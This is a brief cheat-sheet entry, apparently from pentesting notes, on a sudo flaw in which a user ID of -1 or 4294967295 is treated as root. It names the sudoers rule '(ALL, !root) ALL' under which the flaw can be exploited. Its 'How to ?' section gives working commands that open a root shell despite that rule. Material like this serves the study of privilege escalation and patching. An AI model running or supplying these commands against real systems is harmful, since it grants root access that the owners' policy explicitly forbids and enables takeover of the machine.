# Security Bypass
The security policy bypass vulnerability that allows users on a Linux system to execute commands as root, while the user permissions in the `sudoers` file explicitly prevents these commands from being run as root.

If you specify a UID of -1 (or its unsigned equivalent: 4294967295), Sudo would incorrectly read this as being 0 (i.e. root).  
E.g: `sudo -u#-1 /bin/bash` 
## How to ?
```
# Exploitable when a user have the following permissions (sudo -l)
(ALL, !root) ALL

# If you have a full TTY, you can exploit it like this
sudo -u#-1 /bin/bash
sudo -u#4294967295 id
```
